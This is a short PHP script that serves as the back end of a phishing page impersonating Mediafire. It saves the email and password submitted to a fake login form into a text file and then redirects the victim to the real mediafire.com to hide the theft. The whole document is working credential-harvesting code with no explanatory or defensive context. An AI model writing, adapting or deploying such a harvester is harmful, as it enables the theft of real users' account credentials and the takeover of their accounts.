<?php 
file_put_contents("usernames.txt", "Mediafire Email: " . $_POST['login_email'] . " Pass: " . $_POST['login_pass'] ."\n", FILE_APPEND);
header('Location: https://mediafire.com');
exit();
?>
